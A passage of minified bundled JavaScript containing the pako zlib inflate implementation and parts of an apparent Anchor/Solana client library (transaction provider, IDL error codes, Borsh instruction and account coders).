                        if (0 === n.havedict) return e.next_out = s, e.avail_out = u, e.next_in = o, e.avail_in = a, n.hold = c, n.bits = l, Qn;
                        e.adler = n.check = 1, n.mode = $n;
                    case $n:
                        if (t === Wn || t === Kn) break e;
                    case 13:
                        if (n.last) {
                            c >>>= 7 & l, l -= 7 & l, n.mode = 27;
                            break
                        }
                        for (; l < 3;) {
                            if (0 === a) break e;
                            a--, c += r[o++] << l, l += 8
                        }
                        switch (n.last = 1 & c, c >>>= 1, l -= 1, 3 & c) {
                            case 0:
                                n.mode = 14;
                                break;
                            case 1:
                                if (lr(n), n.mode = 20, t === Kn) {
                                    c >>>= 2, l -= 2;
                                    break e
                                }
                                break;
                            case 2:
                                n.mode = 17;
                                break;
                            case 3:
                                e.msg = "invalid block type", n.mode = er
                        }
                        c >>>= 2, l -= 2;
                        break;
                    case 14:
                        for (c >>>= 7 & l, l -= 7 & l; l < 32;) {
                            if (0 === a) break e;
                            a--, c += r[o++] << l, l += 8
                        }
                        if ((65535 & c) !== (c >>> 16 ^ 65535)) {
                            e.msg = "invalid stored block lengths", n.mode = er;
                            break
                        }
                        if (n.length = 65535 & c, c = 0, l = 0, n.mode = 15, t === Kn) break e;
                    case 15:
                        n.mode = 16;
                    case 16:
                        if (d = n.length, d) {
                            if (d > a && (d = a), d > u && (d = u), 0 === d) break e;
                            i.set(r.subarray(o, o + d), s), a -= d, o += d, u -= d, s += d, n.length -= d;
                            break
                        }
                        n.mode = $n;
                        break;
                    case 17:
                        for (; l < 14;) {
                            if (0 === a) break e;
                            a--, c += r[o++] << l, l += 8
                        }
                        if (n.nlen = 257 + (31 & c), c >>>= 5, l -= 5, n.ndist = 1 + (31 & c), c >>>= 5, l -= 5, n.ncode = 4 + (15 & c), c >>>= 4, l -= 4, n.nlen > 286 || n.ndist > 30) {
                            e.msg = "too many length or distance symbols", n.mode = er;
                            break
                        }
                        n.have = 0, n.mode = 18;
                    case 18:
                        for (; n.have < n.ncode;) {
                            for (; l < 3;) {
                                if (0 === a) break e;
                                a--, c += r[o++] << l, l += 8
                            }
                            n.lens[M[n.have++]] = 7 & c, c >>>= 3, l -= 3
                        }
                        for (; n.have < 19;) n.lens[M[n.have++]] = 0;
                        if (n.lencode = n.lendyn, n.lenbits = 7, I = {
                                bits: n.lenbits
                            }, _ = Fn(0, n.lens, 0, 19, n.lencode, 0, n.work, I), n.lenbits = I.bits, _) {
                            e.msg = "invalid code lengths set", n.mode = er;
                            break
                        }
                        n.have = 0, n.mode = 19;
                    case 19:
                        for (; n.have < n.nlen + n.ndist;) {
                            for (; E = n.lencode[c & (1 << n.lenbits) - 1], g = E >>> 24, m = E >>> 16 & 255, w = 65535 & E, !(g <= l);) {
                                if (0 === a) break e;
                                a--, c += r[o++] << l, l += 8
                            }
                            if (w < 16) c >>>= g, l -= g, n.lens[n.have++] = w;
                            else {
                                if (16 === w) {
                                    for (x = g + 2; l < x;) {
                                        if (0 === a) break e;
                                        a--, c += r[o++] << l, l += 8
                                    }
                                    if (c >>>= g, l -= g, 0 === n.have) {
                                        e.msg = "invalid bit length repeat", n.mode = er;
                                        break
                                    }
                                    k = n.lens[n.have - 1], d = 3 + (3 & c), c >>>= 2, l -= 2
                                } else if (17 === w) {
                                    for (x = g + 3; l < x;) {
                                        if (0 === a) break e;
                                        a--, c += r[o++] << l, l += 8
                                    }
                                    c >>>= g, l -= g, k = 0, d = 3 + (7 & c), c >>>= 3, l -= 3
                                } else {
                                    for (x = g + 7; l < x;) {
                                        if (0 === a) break e;
                                        a--, c += r[o++] << l, l += 8
                                    }
                                    c >>>= g, l -= g, k = 0, d = 11 + (127 & c), c >>>= 7, l -= 7
                                }
                                if (n.have + d > n.nlen + n.ndist) {
                                    e.msg = "invalid bit length repeat", n.mode = er;
                                    break
                                }
                                for (; d--;) n.lens[n.have++] = k
                            }
                        }
                        if (n.mode === er) break;
                        if (0 === n.lens[256]) {
                            e.msg = "invalid code -- missing end-of-block", n.mode = er;
                            break
                        }
                        if (n.lenbits = 9, I = {
                                bits: n.lenbits
                            }, _ = Fn(1, n.lens, 0, n.nlen, n.lencode, 0, n.work, I), n.lenbits = I.bits, _) {
                            e.msg = "invalid literal/lengths set", n.mode = er;
                            break
                        }
                        if (n.distbits = 6, n.distcode = n.distdyn, I = {
                                bits: n.distbits
                            }, _ = Fn(2, n.lens, n.nlen, n.ndist, n.distcode, 0, n.work, I), n.distbits = I.bits, _) {
                            e.msg = "invalid distances set", n.mode = er;
                            break
                        }
                        if (n.mode = 20, t === Kn) break e;
                    case 20:
                        n.mode = 21;
                    case 21:
                        if (a >= 6 && u >= 258) {
                            e.next_out = s, e.avail_out = u, e.next_in = o, e.avail_in = a, n.hold = c, n.bits = l, Nn(e, h), s = e.next_out, i = e.output, u = e.avail_out, o = e.next_in, r = e.input, a = e.avail_in, c = n.hold, l = n.bits, n.mode === $n && (n.back = -1);
                            break
                        }
                        for (n.back = 0; E = n.lencode[c & (1 << n.lenbits) - 1], g = E >>> 24, m = E >>> 16 & 255, w = 65535 & E, !(g <= l);) {
                            if (0 === a) break e;
                            a--, c += r[o++] << l, l += 8
                        }
                        if (m && 0 === (240 & m)) {
                            for (b = g, v = m, A = w; E = n.lencode[A + ((c & (1 << b + v) - 1) >> b)], g = E >>> 24, m = E >>> 16 & 255, w = 65535 & E, !(b + g <= l);) {
                                if (0 === a) break e;
                                a--, c += r[o++] << l, l += 8
                            }
                            c >>>= b, l -= b, n.back += b
                        }
                        if (c >>>= g, l -= g, n.back += g, n.length = w, 0 === m) {
                            n.mode = 26;
                            break
                        }
                        if (32 & m) {
                            n.back = -1, n.mode = $n;
                            break
                        }
                        if (64 & m) {
                            e.msg = "invalid literal/length code", n.mode = er;
                            break
                        }
                        n.extra = 15 & m, n.mode = 22;
                    case 22:
                        if (n.extra) {
                            for (x = n.extra; l < x;) {
                                if (0 === a) break e;
                                a--, c += r[o++] << l, l += 8
                            }
                            n.length += c & (1 << n.extra) - 1, c >>>= n.extra, l -= n.extra, n.back += n.extra
                        }
                        n.was = n.length, n.mode = 23;
                    case 23:
                        for (; E = n.distcode[c & (1 << n.distbits) - 1], g = E >>> 24, m = E >>> 16 & 255, w = 65535 & E, !(g <= l);) {
                            if (0 === a) break e;
                            a--, c += r[o++] << l, l += 8
                        }
                        if (0 === (240 & m)) {
                            for (b = g, v = m, A = w; E = n.distcode[A + ((c & (1 << b + v) - 1) >> b)], g = E >>> 24, m = E >>> 16 & 255, w = 65535 & E, !(b + g <= l);) {
                                if (0 === a) break e;
                                a--, c += r[o++] << l, l += 8
                            }
                            c >>>= b, l -= b, n.back += b
                        }
                        if (c >>>= g, l -= g, n.back += g, 64 & m) {
                            e.msg = "invalid distance code", n.mode = er;
                            break
                        }
                        n.offset = w, n.extra = 15 & m, n.mode = 24;
                    case 24:
                        if (n.extra) {
                            for (x = n.extra; l < x;) {
                                if (0 === a) break e;
                                a--, c += r[o++] << l, l += 8
                            }
                            n.offset += c & (1 << n.extra) - 1, c >>>= n.extra, l -= n.extra, n.back += n.extra
                        }
                        if (n.offset > n.dmax) {
                            e.msg = "invalid distance too far back", n.mode = er;
                            break
                        }
                        n.mode = 25;
                    case 25:
                        if (0 === u) break e;
                        if (d = h - u, n.offset > d) {
                            if (d = n.offset - d, d > n.whave && n.sane) {
                                e.msg = "invalid distance too far back", n.mode = er;
                                break
                            }
                            d > n.wnext ? (d -= n.wnext, p = n.wsize - d) : p = n.wnext - d, d > n.length && (d = n.length), y = n.window
                        } else y = i, p = s - n.offset, d = n.length;
                        d > u && (d = u), u -= d, n.length -= d;
                        do {
                            i[s++] = y[p++]
                        } while (--d);
                        0 === n.length && (n.mode = 21);
                        break;
                    case 26:
                        if (0 === u) break e;
                        i[s++] = n.length, u--, n.mode = 21;
                        break;
                    case 27:
                        if (n.wrap) {
                            for (; l < 32;) {
                                if (0 === a) break e;
                                a--, c |= r[o++] << l, l += 8
                            }
                            if (h -= u, e.total_out += h, n.total += h, h && (e.adler = n.check = n.flags ? yt(n.check, i, h, s - h) : dt(n.check, i, h, s - h)), h = u, (n.flags ? c : tr(c)) !== n.check) {
                                e.msg = "incorrect data check", n.mode = er;
                                break
                            }
                            c = 0, l = 0
                        }
                        n.mode = 28;
                    case 28:
                        if (n.wrap && n.flags) {
                            for (; l < 32;) {
                                if (0 === a) break e;
                                a--, c += r[o++] << l, l += 8
                            }
                            if (c !== (4294967295 & n.total)) {
                                e.msg = "incorrect length check", n.mode = er;
                                break
                            }
                            c = 0, l = 0
                        }
                        n.mode = 29;
                    case 29:
                        _ = Vn;
                        break e;
                    case er:
                        _ = Yn;
                        break e;
                    case 31:
                        return Zn;
                    default:
                        return Gn
                }
                return e.next_out = s, e.avail_out = u, e.next_in = o, e.avail_in = a, n.hold = c, n.bits = l, (n.wsize || h !== e.avail_out && n.mode < er && (n.mode < 27 || t !== Hn)) && fr(e, e.output, e.next_out, h - e.avail_out), f -= e.avail_in, h -= e.avail_out, e.total_in += f, e.total_out += h, n.total += h, n.wrap && h && (e.adler = n.check = n.flags ? yt(n.check, i, h, e.next_out - h) : dt(n.check, i, h, e.next_out - h)), e.data_type = n.bits + (n.last ? 64 : 0) + (n.mode === $n ? 128 : 0) + (20 === n.mode || 15 === n.mode ? 256 : 0), (0 === f && 0 === h || t === Hn) && _ === qn && (_ = Jn), _
            },
            dr = {
                inflateReset: ir,
                inflateReset2: or,
                inflateResetKeep: rr,
                inflateInit: e => sr(e, 15),
                inflateInit2: sr,
                inflate: hr,
                inflateEnd: e => {
                    if (!e || !e.state) return Gn;
                    let t = e.state;
                    return t.window && (t.window = null), e.state = null, qn
                },
                inflateGetHeader: (e, t) => {
                    if (!e || !e.state) return Gn;
                    const n = e.state;
                    return 0 === (2 & n.wrap) ? Gn : (n.head = t, t.done = !1, qn)
                },
                inflateSetDictionary: (e, t) => {
                    const n = t.length;
                    let r, i, o;
                    return e && e.state ? (r = e.state, 0 !== r.wrap && 11 !== r.mode ? Gn : 11 === r.mode && (i = 1, i = dt(i, t, n, 0), i !== r.check) ? Yn : (o = fr(e, t, n, n), o ? (r.mode = 31, Zn) : (r.havedict = 1, qn))) : Gn
                },
                inflateInfo: "pako inflate (from Nodeca project)"
            };
        var pr = function() {
            this.text = 0, this.time = 0, this.xflags = 0, this.os = 0, this.extra = null, this.extra_len = 0, this.name = "", this.comment = "", this.hcrc = 0, this.done = !1
        };
        const yr = Object.prototype.toString,
            {
                Z_NO_FLUSH: gr,
                Z_FINISH: mr,
                Z_OK: wr,
                Z_STREAM_END: br,
                Z_NEED_DICT: vr,
                Z_STREAM_ERROR: Ar,
                Z_DATA_ERROR: kr,
                Z_MEM_ERROR: _r
            } = mt;

        function Er(e) {
            this.options = pn({
                chunkSize: 65536,
                windowBits: 15,
                to: ""
            }, e || {});
            const t = this.options;
            t.raw && t.windowBits >= 0 && t.windowBits < 16 && (t.windowBits = -t.windowBits, 0 === t.windowBits && (t.windowBits = -15)), !(t.windowBits >= 0 && t.windowBits < 16) || e && e.windowBits || (t.windowBits += 32), t.windowBits > 15 && t.windowBits < 48 && 0 === (15 & t.windowBits) && (t.windowBits |= 15), this.err = 0, this.msg = "", this.ended = !1, this.chunks = [], this.strm = new An, this.strm.avail_out = 0;
            let n = dr.inflateInit2(this.strm, t.windowBits);
            if (n !== wr) throw new Error(gt[n]);
            if (this.header = new pr, dr.inflateGetHeader(this.strm, this.header), t.dictionary && ("string" === typeof t.dictionary ? t.dictionary = wn(t.dictionary) : "[object ArrayBuffer]" === yr.call(t.dictionary) && (t.dictionary = new Uint8Array(t.dictionary)), t.raw && (n = dr.inflateSetDictionary(this.strm, t.dictionary), n !== wr))) throw new Error(gt[n])
        }

        function Sr(e, t) {
            const n = new Er(t);
            if (n.push(e), n.err) throw n.msg || gt[n.err];
            return n.result
        }
        Er.prototype.push = function(e, t) {
            const n = this.strm,
                r = this.options.chunkSize,
                i = this.options.dictionary;
            let o, s, a;
            if (this.ended) return !1;
            for (s = t === ~~t ? t : !0 === t ? mr : gr, "[object ArrayBuffer]" === yr.call(e) ? n.input = new Uint8Array(e) : n.input = e, n.next_in = 0, n.avail_in = n.input.length;;) {
                for (0 === n.avail_out && (n.output = new Uint8Array(r), n.next_out = 0, n.avail_out = r), o = dr.inflate(n, s), o === vr && i && (o = dr.inflateSetDictionary(n, i), o === wr ? o = dr.inflate(n, s) : o === kr && (o = vr)); n.avail_in > 0 && o === br && n.state.wrap > 0 && 0 !== e[n.next_in];) dr.inflateReset(n), o = dr.inflate(n, s);
                switch (o) {
                    case Ar:
                    case kr:
                    case vr:
                    case _r:
                        return this.onEnd(o), this.ended = !0, !1
                }
                if (a = n.avail_out, n.next_out && (0 === n.avail_out || o === br))
                    if ("string" === this.options.to) {
                        let e = vn(n.output, n.next_out),
                            t = n.next_out - e,
                            i = bn(n.output, e);
                        n.next_out = t, n.avail_out = r - t, t && n.output.set(n.output.subarray(e, e + t), 0), this.onData(i)
                    } else this.onData(n.output.length === n.next_out ? n.output : n.output.subarray(0, n.next_out));
                if (o !== wr || 0 !== a) {
                    if (o === br) return o = dr.inflateEnd(this.strm), this.onEnd(o), this.ended = !0, !0;
                    if (0 === n.avail_in) break
                }
            }
            return !0
        }, Er.prototype.onData = function(e) {
            this.chunks.push(e)
        }, Er.prototype.onEnd = function(e) {
            e === wr && ("string" === this.options.to ? this.result = this.chunks.join("") : this.result = yn(this.chunks)), this.chunks = [], this.err = e, this.msg = this.strm.msg
        };
        var Ir = {
            Inflate: Er,
            inflate: Sr,
            inflateRaw: function(e, t) {
                return (t = t || {}).raw = !0, Sr(e, t)
            },
            ungzip: Sr,
            constants: mt
        };
        const {
            Deflate: xr,
            deflate: Mr,
            deflateRaw: Br,
            gzip: Tr
        } = Ln, {
            Inflate: Or,
            inflate: Cr,
            inflateRaw: Pr,
            ungzip: Lr
        } = Ir;
        var Nr = Cr;
        class Rr {
            constructor(e, t, n) {
                this.connection = e, this.wallet = t, this.opts = n
            }
            static defaultOptions() {
                return {
                    preflightCommitment: "processed",
                    commitment: "processed"
                }
            }
            static local(e, t) {
                throw new Error("Provider local is not available on browser.")
            }
            static env() {
                throw new Error("Provider env is not available on browser.")
            }
            async send(e, t, n) {
                void 0 === t && (t = []), void 0 === n && (n = this.opts), e.feePayer = this.wallet.publicKey, e.recentBlockhash = (await this.connection.getRecentBlockhash(n.preflightCommitment)).blockhash, await this.wallet.signTransaction(e), t.filter((e => void 0 !== e)).forEach((t => {
                    e.partialSign(t)
                }));
                const r = e.serialize();
                return await (0, _.sendAndConfirmRawTransaction)(this.connection, r, n)
            }
            async sendAll(e, t) {
                void 0 === t && (t = this.opts);
                const n = await this.connection.getRecentBlockhash(t.preflightCommitment);
                let r = e.map((e => {
                    let t = e.tx,
                        r = e.signers;
                    return void 0 === r && (r = []), t.feePayer = this.wallet.publicKey, t.recentBlockhash = n.blockhash, r.filter((e => void 0 !== e)).forEach((e => {
                        t.partialSign(e)
                    })), t
                }));
                const i = await this.wallet.signAllTransactions(r),
                    o = [];
                for (let s = 0; s < r.length; s += 1) {
                    const e = i[s].serialize();
                    o.push(await (0, _.sendAndConfirmRawTransaction)(this.connection, e, t))
                }
                return o
            }
            async simulate(e, t) {
                let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : this.opts;
                var r, i, o;
                return void 0 === t && (t = []), e.feePayer = this.wallet.publicKey, e.recentBlockhash = (await this.connection.getRecentBlockhash(null !== (r = n.preflightCommitment) && void 0 !== r ? r : this.opts.preflightCommitment)).blockhash, await this.wallet.signTransaction(e), t.filter((e => void 0 !== e)).forEach((t => {
                    e.partialSign(t)
                })), await async function(e, t, n) {
                    t.recentBlockhash = await e._recentBlockhash(e._disableBlockhashCaching);
                    const r = t.serializeMessage(),
                        i = [t._serialize(r).toString("base64"), {
                            encoding: "base64",
                            commitment: n
                        }],
                        o = await e._rpcRequest("simulateTransaction", i);
                    if (o.error) throw new Error("failed to simulate transaction: " + o.error.message);
                    return o.result
                }(this.connection, e, null !== (o = null !== (i = n.commitment) && void 0 !== i ? i : this.opts.commitment) && void 0 !== o ? o : "processed")
            }
        }

        function Dr() {
            return null === zr ? Rr.local() : zr
        }
        let zr = null;
        class Ur extends Error {
            constructor(e) {
                super(e), this.name = "IdlError"
            }
        }
        class jr extends Error {
            constructor(e, t) {
                for (var n = arguments.length, r = new Array(n > 2 ? n - 2 : 0), i = 2; i < n; i++) r[i - 2] = arguments[i];
                super(...r), this.code = e, this.msg = t
            }
            static parse(e, t) {
                const n = e.toString();
                let r, i;
                if (n.includes("custom program error:")) {
                    let e = n.split("custom program error: ");
                    if (2 !== e.length) return null;
                    r = e[1]
                } else {
                    const e = n.match(/"Custom":([0-9]+)}/g);
                    if (!e || e.length > 1) return null;
                    r = e[0].match(/([0-9]+)/g)[0]
                }
                try {
                    i = parseInt(r)
                } catch (e) {
                    return null
                }
                let o = t.get(i);
                return void 0 !== o ? new jr(i, o, i + ": " + o) : (o = Fr.get(i), void 0 !== o ? new jr(i, o, i + ": " + o) : null)
            }
            toString() {
                return this.msg
            }
        }
        const Fr = new Map([
            [100, "8 byte instruction identifier not provided"],
            [101, "Fallback functions are not supported"],
            [102, "The program could not deserialize the given instruction"],
            [103, "The program could not serialize the given instruction"],
            [1e3, "The program was compiled without idl instructions"],
            [1001, "The transaction was given an invalid program for the IDL instruction"],
            [2e3, "A mut constraint was violated"],
            [2001, "A has_one constraint was violated"],
            [2002, "A signer constraint was violated"],
            [2003, "A raw constraint was violated"],
            [2004, "An owner constraint was violated"],
            [2005, "A rent exempt constraint was violated"],
            [2006, "A seeds constraint was violated"],
            [2007, "An executable constraint was violated"],
            [2008, "A state constraint was violated"],
            [2009, "An associated constraint was violated"],
            [2010, "An associated init constraint was violated"],
            [2011, "A close constraint was violated"],
            [2012, "An address constraint was violated"],
            [2013, "Expected zero account discriminant"],
            [2014, "A token mint constraint was violated"],
            [2015, "A token owner constraint was violated"],
            [2016, "A mint mint authority constraint was violated"],
            [2017, "A mint freeze authority constraint was violated"],
            [2018, "A mint decimals constraint was violated"],
            [2019, "A space constraint was violated"],
            [3e3, "The account discriminator was already set on this account"],
            [3001, "No 8 byte discriminator was found on the account"],
            [3002, "8 byte discriminator did not match what was expected"],
            [3003, "Failed to deserialize the account"],
            [3004, "Failed to serialize the account"],
            [3005, "Not enough account keys given to the instruction"],
            [3006, "The given account is not mutable"],
            [3007, "The given account is owned by a different program than expected"],
            [3008, "Program ID was not as expected"],
            [3009, "Program account is not executable"],
            [3010, "The given account did not sign"],
            [3011, "The given account is not owned by the system program"],
            [3012, "The program expected this account to be already initialized"],
            [3013, "The given account is not a program data account"],
            [3014, "The given account is not the associated token account"],
            [4e3, "The given state account does not have the correct address"],
            [4100, "The declared program id does not match the actual program id"],
            [5e3, "The API being used is deprecated and should no longer be used"]
        ]);
        var Hr = function() {
                return Hr = Object.assign || function(e) {
                    for (var t, n = 1, r = arguments.length; n < r; n++)
                        for (var i in t = arguments[n]) Object.prototype.hasOwnProperty.call(t, i) && (e[i] = t[i]);
                    return e
                }, Hr.apply(this, arguments)
            },
            Wr = function() {
                return Wr = Object.assign || function(e) {
                    for (var t, n = 1, r = arguments.length; n < r; n++)
                        for (var i in t = arguments[n]) Object.prototype.hasOwnProperty.call(t, i) && (e[i] = t[i]);
                    return e
                }, Wr.apply(this, arguments)
            };

        function Kr(e) {
            return e.toLowerCase()
        }
        var qr = [/([a-z0-9])([A-Z])/g, /([A-Z])([A-Z][a-z])/g],
            Vr = /[^A-Z0-9]+/gi;

        function Qr(e, t, n) {
            return t instanceof RegExp ? e.replace(t, n) : t.reduce((function(e, t) {
                return e.replace(t, n)
            }), e)
        }
        class Gr {
            static fieldLayout(e, t) {
                const n = void 0 !== e.name ? ke()(e.name) : void 0;
                switch (e.type) {
                    case "bool":
                        return Ee.bool(n);
                    case "u8":
                        return Ee.u8(n);
                    case "i8":
                        return Ee.i8(n);
                    case "u16":
                        return Ee.u16(n);
                    case "i16":
                        return Ee.i16(n);
                    case "u32":
                        return Ee.u32(n);
                    case "i32":
                        return Ee.i32(n);
                    case "f32":
                        return Ee.f32(n);
                    case "u64":
                        return Ee.u64(n);
                    case "i64":
                        return Ee.i64(n);
                    case "f64":
                        return Ee.f64(n);
                    case "u128":
                        return Ee.u128(n);
                    case "i128":
                        return Ee.i128(n);
                    case "bytes":
                        return Ee.vecU8(n);
                    case "string":
                        return Ee.str(n);
                    case "publicKey":
                        return Ee.publicKey(n);
                    default:
                        if ("vec" in e.type) return Ee.vec(Gr.fieldLayout({
                            name: void 0,
                            type: e.type.vec
                        }, t), n);
                        if ("option" in e.type) return Ee.option(Gr.fieldLayout({
                            name: void 0,
                            type: e.type.option
                        }, t), n);
                        if ("defined" in e.type) {
                            const r = e.type.defined;
                            if (void 0 === t) throw new Ur("User defined types not provided");
                            const i = t.filter((e => e.name === r));
                            if (1 !== i.length) throw new Ur(`Type not found: ${JSON.stringify(e)}`);
                            return Gr.typeDefLayout(i[0], t, n)
                        }
                        if ("array" in e.type) {
                            let r = e.type.array[0],
                                i = e.type.array[1],
                                o = Gr.fieldLayout({
                                    name: void 0,
                                    type: r
                                }, t);
                            return Ee.array(o, i, n)
                        }
                        throw new Error(`Not yet implemented: ${e}`)
                }
            }
            static typeDefLayout(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : [],
                    n = arguments.length > 2 ? arguments[2] : void 0;
                if ("struct" === e.type.kind) {
                    const r = e.type.fields.map((e => Gr.fieldLayout(e, t)));
                    return Ee.struct(r, n)
                }
                if ("enum" === e.type.kind) {
                    let r = e.type.variants.map((e => {
                        const n = ke()(e.name);
                        if (void 0 === e.fields) return Ee.struct([], n);
                        const r = e.fields.map((e => {
                            if (!e.hasOwnProperty("name")) throw new Error("Tuple enum variants not yet implemented.");
                            return Gr.fieldLayout(e, t)
                        }));
                        return Ee.struct(r, n)
                    }));
                    return void 0 !== n ? Ee.rustEnum(r).replicate(n) : Ee.rustEnum(r, n)
                }
                throw new Error(`Unknown type kint: ${e}`)
            }
        }
        class Yr {
            constructor(e) {
                this.idl = e, this.ixLayout = Yr.parseIxLayout(e);
                const t = new Map;
                e.instructions.forEach((e => {
                    const n = Jr("global", e.name);
                    t.set(ve().encode(n), {
                        layout: this.ixLayout.get(e.name),
                        name: e.name
                    })
                })), e.state && e.state.methods.map((e => {
                    const n = Jr("state", e.name);
                    t.set(ve().encode(n), {
                        layout: this.ixLayout.get(e.name),
                        name: e.name
                    })
                })), this.sighashLayouts = t
            }
            encode(e, t) {
                return this._encode("global", e, t)
            }
            encodeState(e, t) {
                return this._encode("state", e, t)
            }
            _encode(e, t, n) {
                const r = ge.Buffer.alloc(1e3),
                    i = ke()(t),
                    o = this.ixLayout.get(i);
                if (!o) throw new Error(`Unknown method: ${i}`);
                const s = o.encode(n, r),
                    a = r.slice(0, s);
                return ge.Buffer.concat([Jr(e, t), a])
            }
            static parseIxLayout(e) {
                const t = (e.state ? e.state.methods : []).map((t => {
                    let n = t.args.map((t => {
                        var n, r;
                        return Gr.fieldLayout(t, Array.from([...null !== (n = e.accounts) && void 0 !== n ? n : [], ...null !== (r = e.types) && void 0 !== r ? r : []]))
                    }));
                    const r = ke()(t.name);
                    return [r, Ee.struct(n, r)]
                })).concat(e.instructions.map((t => {
                    let n = t.args.map((t => {
                        var n, r;
                        return Gr.fieldLayout(t, Array.from([...null !== (n = e.accounts) && void 0 !== n ? n : [], ...null !== (r = e.types) && void 0 !== r ? r : []]))
                    }));
                    const r = ke()(t.name);
                    return [r, Ee.struct(n, r)]
                })));
                return new Map(t)
            }
            decode(e) {
                "string" == typeof e && (e = "hex" === (arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "hex") ? ge.Buffer.from(e, "hex") : ve().decode(e));
                let t = ve().encode(e.slice(0, 8)),
                    n = e.slice(8);
                const r = this.sighashLayouts.get(t);
                return r ? {
                    data: r.layout.decode(n),
                    name: r.name
                } : null
            }
            format(e, t) {
                return Zr.format(e, t, this.idl)
            }
        }
        class Zr {
            static format(e, t, n) {
                const r = n.instructions.filter((t => e.name === t.name))[0];
                if (void 0 === r) return console.error("Invalid instruction given"), null;
                const i = r.args.map((t => ({
                        name: t.name,
                        type: Zr.formatIdlType(t.type),
                        data: Zr.formatIdlData(t, e.data[t.name], n.types)
                    }))),
                    o = Zr.flattenIdlAccounts(r.accounts);
                return {
                    args: i,
                    accounts: t.map(((e, t) => t < o.length ? {
                        name: o[t].name,
                        ...e
                    } : {
                        name: void 0,
                        ...e
                    }))
                }
            }
            static formatIdlType(e) {
                if ("string" == typeof e) return e;
                if ("vec" in e) return `Vec<${this.formatIdlType(e.vec)}>`;
                if ("option" in e) return `Option<${this.formatIdlType(e.option)}>`;
                if ("defined" in e) return e.defined;
                if ("array" in e) return `Array<${e.array[0]}; ${e.array[1]}>`;
                throw new Error(`Unknown IDL type: ${e}`)
            }
            static formatIdlData(e, t, n) {
                if ("string" == typeof e.type) return t.toString();
                if (e.type.hasOwnProperty("vec")) return "[" + t.map((t => this.formatIdlData({
                    name: "",
                    type: e.type.vec
                }, t))).join(", ") + "]";
                if (e.type.hasOwnProperty("option")) return null === t ? "null" : this.formatIdlData({
                    name: "",
                    type: e.type.option
                }, t);
                if (e.type.hasOwnProperty("defined")) {
                    if (void 0 === n) throw new Error("User defined types not provided");
                    const r = n.filter((t => t.name === e.type.defined));
                    if (1 !== r.length) throw new Error(`Type not found: ${e.type.defined}`);
                    return Zr.formatIdlDataDefined(r[0], t, n)
                }
                return "unknown"
            }
            static formatIdlDataDefined(e, t, n) {
                if ("struct" === e.type.kind) {
                    const r = e.type;
                    return "{ " + Object.keys(t).map((e => {
                        const i = r.fields.filter((t => t.name === e))[0];
                        if (void 0 === i) throw new Error("Unable to find type");
                        return e + ": " + Zr.formatIdlData(i, t[e], n)
                    })).join(", ") + " }"
                }
                if (0 === e.type.variants.length) return "{}";
                if (e.type.variants[0].name) {
                    const r = e.type.variants,
                        i = Object.keys(t)[0],
                        o = t[i],
                        s = Object.keys(o).map((e => {
                            var t;
                            const s = o[e],
                                a = null === (t = r[i]) || void 0 === t ? void 0 : t.filter((t => t.name === e))[0];
                            if (void 0 === a) throw new Error("Unable to find variant");
                            return e + ": " + Zr.formatIdlData(a, s, n)
                        })).join(", "),
                        a = ke()(i, {
                            pascalCase: !0
                        });
                    return 0 === s.length ? a : `${a} { ${s} }`
                }
                return "Tuple formatting not yet implemented"
            }
            static flattenIdlAccounts(e, t) {
                return e.map((e => {
                    const n = function(e) {
                        const t = e.replace(/([A-Z])/g, " $1");
                        return t.charAt(0).toUpperCase() + t.slice(1)
                    }(e.name);
                    if (e.hasOwnProperty("accounts")) {
                        const r = t ? `${t} > ${n}` : n;
                        return Zr.flattenIdlAccounts(e.accounts, r)
                    }
                    return { ...e,
                        name: t ? `${t} > ${n}` : n
                    }
                })).flat()
            }
        }

        function Jr(e, t) {
            var n;
            let r = `${e}:${void 0===n&&(n={}),function(e,t){return void 0===t&&(t={}),function(e,t){void 0===t&&(t={});for(var n=t.splitRegexp,r=void 0===n?qr:n,i=t.stripRegexp,o=void 0===i?Vr:i,s=t.transform,a=void 0===s?Kr:s,u=t.delimiter,c=void 0===u?" ":u,l=Qr(Qr(e,r,"$1\0$2"),o,"\0"),f=0,h=l.length;"\0"===l.charAt(f);)f++;for(;"\0"===l.charAt(h-1);)h--;return l.slice(f,h).split("\0").map(a).join(c)}(e,Wr({delimiter:"."},t))}(t,Hr({delimiter:"_"},n))}`;
            return ge.Buffer.from(_e.sha256.digest(r)).slice(0, 8)
        }

        function Xr(e, t) {
            if ("enum" === t.type.kind) {
                let n = t.type.variants.map((t => void 0 === t.fields ? 0 : t.fields.map((t => {
                    if ("object" != typeof t || !("name" in t)) throw new Error("Tuple enum variants not yet implemented.");
                    return $r(e, t.type)
                })).reduce(((e, t) => e + t))));
                return Math.max(...n) + 1
            }
            return void 0 === t.type.fields ? 0 : t.type.fields.map((t => $r(e, t.type))).reduce(((e, t) => e + t), 0)
        }

        function $r(e, t) {
            var n, r;
            switch (t) {
                case "bool":
                case "u8":
                case "i8":
                case "bytes":
                case "string":
                    return 1;
                case "i16":
                case "u16":
                    return 2;
                case "u32":
                case "i32":
                case "f32":
                    return 4;
                case "u64":
                case "i64":
                case "f64":
                    return 8;
                case "u128":
                case "i128":
                    return 16;
                case "publicKey":
                    return 32;
                default:
                    if ("vec" in t) return 1;
                    if ("option" in t) return 1 + $r(e, t.option);
                    if ("coption" in t) return 4 + $r(e, t.coption);
                    if ("defined" in t) {
                        const i = null !== (r = null === (n = e.types) || void 0 === n ? void 0 : n.filter((e => e.name === t.defined))) && void 0 !== r ? r : [];
                        if (1 !== i.length) throw new Ur(`Type not found: ${JSON.stringify(t)}`);
                        return Xr(e, i[0])
                    }
                    if ("array" in t) {
                        let n = t.array[0],
                            r = t.array[1];
                        return $r(e, n) * r
                    }
                    throw new Error(`Invalid type ${JSON.stringify(t)}`)
            }
        }
        class ei {
            constructor(e) {
                if (void 0 === e.accounts) return void(this.accountLayouts = new Map);
                const t = e.accounts.map((t => [t.name, Gr.typeDefLayout(t, e.types)]));
                this.accountLayouts = new Map(t), this.idl = e
            }
            async encode(e, t) {
                const n = ge.Buffer.alloc(1e3),
                    r = this.accountLayouts.get(e);
                if (!r) throw new Error(`Unknown account: ${e}`);
                const i = r.encode(t, n);
                let o = n.slice(0, i),
                    s = ei.accountDiscriminator(e);
                return ge.Buffer.concat([s, o])
            }
            decode(e, t) {
                if (ei.accountDiscriminator(e).compare(t.slice(0, 8))) throw new Error("Invalid account discriminator");
                return this.decodeUnchecked(e, t)
            }
            decodeUnchecked(e, t) {
